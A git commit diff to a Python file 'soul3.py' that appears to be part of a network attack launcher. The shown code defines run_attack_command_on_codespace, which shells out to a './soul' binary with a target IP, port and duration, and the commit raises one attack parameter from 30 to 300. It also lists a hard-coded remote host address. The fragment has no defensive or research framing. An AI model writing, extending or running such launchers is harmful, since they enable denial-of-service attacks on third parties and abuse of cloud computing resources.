6fd63aa286195e8a446cd7a08a240b2e2d72feeb
smakaefa26522 <jsissnsusnaosushdhid@gmail.com>
2025-01-27 16:13:23 +0530

    Update soul3.py

--- soul3.py
+++ soul3.py
@@ -36,7 +36,7 @@ running_processes = []
 
 REMOTE_HOST = '4.213.71.147'  
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./soul {target_ip} {target_port} {duration} 30"
+    command = f"./soul {target_ip} {target_port} {duration} 300"
     try:
        
         process = await asyncio.create_subprocess_shell(
